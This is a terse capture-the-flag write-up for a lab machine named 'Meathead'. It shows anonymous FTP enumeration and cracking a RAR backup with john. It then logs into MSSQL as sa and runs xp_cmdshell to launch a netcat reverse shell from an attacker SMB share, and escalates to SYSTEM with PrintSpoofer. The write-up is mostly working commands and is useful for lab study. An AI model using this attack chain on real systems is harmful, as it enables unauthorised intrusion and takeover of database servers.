# Meathead

### Enumeration

```
1221/tcp open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ...
| 04-27-20  07:02PM                  302 MSSQL_BAK.rar
| ...
```

```
$ rar2john MSSQL_BAK.rar > hash.txt
$ john --format=RAR5 hash.txt --wordlist=~/Desktop/rockyou.txt
[REDACTED]

$ unrar e MSSQL_BAK.rar
```

```
Username: sa
Password: [REDACTED]
```

### Initial Access

```
$ sqsh -S 192.168.99.70:1435 -U sa -P [REDACTED]

1> EXEC master..xp_cmdshell 'whoami'
2> go

        nt service\mssql$sqlexpress
```

smbserver.py - [https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py)

```
$ python smbserver.py share smb
```

nc64.exe - [https://github.com/int0x33/nc.exe](https://github.com/int0x33/nc.exe)

```
1> EXEC master..xp_cmdshell '\\192.168.49.99\share\nc64.exe -e cmd.exe 192.168.49.99 80'
2> go
```

### PrivEsc

SeImpersonatePrivilege - Enabled

PrintSpoofer.exe - [https://github.com/dievus/printspoofer](https://github.com/dievus/printspoofer)

```
C:\>\\192.168.49.99\share\PrintSpoofer.exe -i -c cmd

C:\Windows\system32>
```
